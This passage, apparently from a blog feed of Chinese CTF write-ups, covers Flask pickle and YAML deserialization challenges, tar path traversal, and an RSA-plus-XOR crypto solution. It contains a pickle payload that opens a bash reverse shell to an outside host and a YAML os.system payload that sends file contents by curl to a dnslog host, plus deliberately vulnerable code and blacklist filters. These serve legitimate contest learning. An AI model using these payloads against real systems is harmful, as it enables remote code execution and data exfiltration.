attribute.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> attribute.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> secret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Don&#x27;t play tricks on me&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are a perfect stranger to me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>æŠ“åŒ…ï¼Œåœ¨å“åº”åŒ…é‡Œçœ‹åˆ°sessionï¼Œè§£ç å¾—åˆ°<code>secret_key</code>ä¸º<code>GWHTpNTlRMDw6p</code>ã€‚</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_1.png"></p></li><li><p>ä¼ªé€ sessionï¼Œè®©<code>admin</code>ä¸º1ï¼Œ<code>name</code>ä¸º<code>admin</code>ï¼Œè®¿é—®<code>/verification</code>,å³å¯å¾—åˆ°ä¸‹ä¸€æ­¥æç¤ºã€‚</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_2.png"></p></li><li><p>è®¿é—®<code>/ppppppppppick1e</code>ï¼Œåœ¨å“åº”å¤´çœ‹åˆ°<code>Hint: Source in /src0de</code>ã€‚</p></li><li><p>è®¿é—®<code>/src0de</code>ï¼Œå¾—åˆ°æºç ï¼Œå¯ä»¥å‘ç°è¿™æ˜¯<code>pickleååºåˆ—åŒ–</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æºç </span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></li><li><p>ç»è¿‡æµ‹è¯•ï¼Œè¿‡æ»¤äº†<code>R</code>ï¼Œå› æ­¤RæŒ‡ä»¤ä¸å¯ç”¨ï¼Œæˆ‘ä»¬ä½¿ç”¨CæŒ‡ä»¤æ¥åå¼¹shellã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b=<span class="string">b&quot;\x80\x03c__main__\nGWHT\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVbash -c \&#x27;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1\&#x27;\nb.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"><span class="comment">#b&#x27;gANjX19tYWluX18KR1dIVAopgX0oVl9fc2V0c3RhdGVfXwpjb3MKc3lzdGVtCnViVmJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvNzY1NGR1NjIxNi56aWNwLmZ1bi8zMzY5OSAwPiYxJwpiLg==&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_4.png"></p></li><li><p>æˆåŠŸåå¼¹shellï¼Œåœ¨æ ¹ç›®å½•å‘ç°flagï¼Œä½†æ²¡æœ‰æƒé™è¯»å–ã€‚</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_3.png"></p></li><li><p>ç”¨findå‘½ä»¤æŸ¥æ‰¾å…·æœ‰<code>SUID</code>æƒé™çš„ç¨‹åºï¼Œå‘ç°pythonå…·æœ‰è¿™ä¸ªæƒé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_5.png"></p></li><li><p>æœ€åç”¨pythonæ¥è¯»å–flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;print(open(&quot;/flag&quot;).read())&#x27;</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_6.png"></p></li></ol><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><ol><li><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>å­˜åœ¨éé¢„æœŸï¼Œç”¨readè·¯ç”±ç›´æ¥è¯»<code>/proc/1/environ</code>ï¼Œç›´æ¥å¾—åˆ°flagã€‚</p></li></ol><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>yamlçš„ååºåˆ—åŒ–+tarçš„è·¯å¾„ç©¿è¶Šã€‚</p><ol><li><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;tuple&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;listitems&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;apply&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line"></span><br><span class="line">    extractdir = filepath.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;tar&#x27;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        fn = <span class="string">&#x27;uploads/&#x27;</span> + md5().hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">            os.makedirs(fn)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&#x27;tar&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;config/<span class="subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=<span class="string">&quot;admin&quot;</span>, message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure></li><li><p>åˆ†ææºç ï¼Œå‘ç°å½“ä¸Šä¼ æ–‡ä»¶ä¸º<code>tar</code>æ—¶ï¼Œä¼šè¿›è¡Œä¸€ä¸ªè§£å‹æ“ä½œï¼Œäºæ˜¯æƒ³åˆ°tarè·¯å¾„ç©¿è¶Šã€‚</p></li><li><p>åœ¨<code>/src</code>è·¯ç”±ï¼Œå¯ä»¥å‘ç°å¯¹<code>config</code>ç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡Œä¸€ä¸ªyamlçš„ååºåˆ—åŒ–æ“ä½œï¼Œäºæ˜¯åœ¨æ–‡ä»¶å†…å†™å…¥expï¼Œåˆ©ç”¨curl+dnslogå®ç°å‘½ä»¤å¤–å¸¦ï¼ˆåå¼¹shellä¸æˆåŠŸï¼‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test.yaml</span><br><span class="line">!!python/object/apply:os.system [&#x27;curl http://kbqsag.ceye.io?flag=`cat /fllaagg_here`&#x27;]</span><br></pre></td></tr></table></figure></li><li><p>æ‰“åŒ…æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cPvf midi.tar ../../config/test.yaml</span><br></pre></td></tr></table></figure></li><li><p>ä¹‹åè®¿é—®<code>/src?username=test</code>ï¼Œå³å¯æˆåŠŸå®ç°å¤–å¸¦ã€‚</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web3_1.png"></p></li></ol><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="XORè´¯ç©¿å§‹ç»ˆ"><a href="#XORè´¯ç©¿å§‹ç»ˆ" class="headerlink" title="XORè´¯ç©¿å§‹ç»ˆ"></a>XORè´¯ç©¿å§‹ç»ˆ</h2><p>rsa+å¼‚æˆ–</p><ol><li><p>æ‰“å¼€<code>massege.txt</code>ï¼Œæ˜¯æ ¸å¿ƒä»·å€¼è§‚ç¼–ç ï¼Œè§£ç åå¾—åˆ°å‹ç¼©åŒ…çš„è§£å‹å¯†ç ã€‚ï¼ˆåœ¨çº¿ç½‘ç«™ï¼š<a href="http://www.hiencode.com/cvencode.html%EF%BC%89">http://www.hiencode.com/cvencode.htmlï¼‰</a></p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/c_1_1.png"></p></li><li><p>è§£å‹å‹ç¼©åŒ…åï¼Œæœ‰ä¸€ä¸ªpemæ–‡ä»¶æ˜¯ç§é’¥æ–‡ä»¶ï¼Œå‚è€ƒè¿™ä¸ªï¼ˆ<a href="https://zhuanlan.zhihu.com/p/461349946%EF%BC%89,%E5%8D%B3%E5%8F%AF%E5%88%86%E7%A6%BB%E5%87%BAe%EF%BC%8Cp%EF%BC%8Cq%E3%80%82">https://zhuanlan.zhihu.com/p/461349946ï¼‰,å³å¯åˆ†ç¦»å‡ºeï¼Œpï¼Œqã€‚</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pri=<span class="string">b&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==&quot;</span></span><br><span class="line">decode_pri=<span class="built_in">hex</span>(bytes_to_long(base64.b64decode(pri)))</span><br><span class="line"><span class="built_in">print</span>(decode_pri)</span><br><span class="line">e=re.findall(<span class="string">r&#x27;0203([0-9]&#123;6&#125;)&#x27;</span>,decode_pri)</span><br><span class="line">pq=re.findall(<span class="string">r&#x27;0241(\w&#123;130&#125;)&#x27;</span>,decode_pri)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e= 0x&#x27;</span>+e[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p= 0x&#x27;</span>+pq[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q= 0x&#x27;</span>+pq[<span class="number">1</span>]) </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>å¸¸è§„rsaè§£ç ï¼Œä½†è§£ç åå‘ç°flagååŠéƒ¨åˆ†æ˜¯ä¹±ç ã€‚</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/c_1_2.png"></p></li><li><p>æƒ³åˆ°é¢˜ç›®æç¤ºæœ‰XORï¼Œäºæ˜¯å°†æ­¥éª¤ä¸€å¾—åˆ°å­—ç¬¦ä¸²å’Œmå¼‚æˆ–ä¸€éï¼Œæœ€åå¾—åˆ°flagã€‚</p></li><li><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pri=<span class="string">b&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==&quot;</span></span><br><span class="line">decode_pri=<span class="built_in">hex</span>(bytes_to_long(base64.b64decode(pri)))</span><br><span class="line"><span class="comment">#print(decode_pri)</span></span><br><span class="line">e=re.findall(<span class="string">r&#x27;0203([0-9]&#123;6&#125;)&#x27;</span>,decode_pri)</span><br><span class="line">pq=re.findall(<span class="string">r&#x27;0241(\w&#123;130&#125;)&#x27;</span>,decode_pri)</span><br><span class="line"><span class="comment">#print(&#x27;e= 0x&#x27;+e[0])</span></span><br><span class="line"><span class="comment">#print(&#x27;p= 0x&#x27;+pq[0])</span></span><br><span class="line"><span class="comment">#print(&#x27;q= 0x&#x27;+pq[1]) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="comment">#å¡«p</span></span><br><span class="line">p = <span class="built_in">int</span>(pq[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¡«q</span></span><br><span class="line">q = <span class="built_in">int</span>(pq[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment">#å¡«c</span></span><br><span class="line">c=<span class="number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">xor=bytes_to_long(<span class="string">b&#x27;C0ngr4tulati0n5_y0u_fou^d_m3&#x27;</span>)</span><br><span class="line">flag = long_to_bytes(m^xor)</span><br><span class="line"><span class="comment">#flag = long_to_bytes(m)</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_2nd_WP</title>
      <link href="/NSSCTF_2nd_WP/"/>
      <url>/NSSCTF_2nd_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="phpç­¾åˆ°"><a href="#phpç­¾åˆ°" class="headerlink" title="phpç­¾åˆ°"></a>phpç­¾åˆ°</h2><p>ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œé‡ç‚¹åœ¨ç»•<code>pathinfo($filename, PATHINFO_EXTENSION)</code>ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_44532761/article/details/121603082">2021&#x2F;11&#x2F;29æ–‡ä»¶ä¸Šä¼ -å†…å®¹åŠå…¶å®ƒé€»è¾‘æ•°ç»„ç»•è¿‡</a></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span 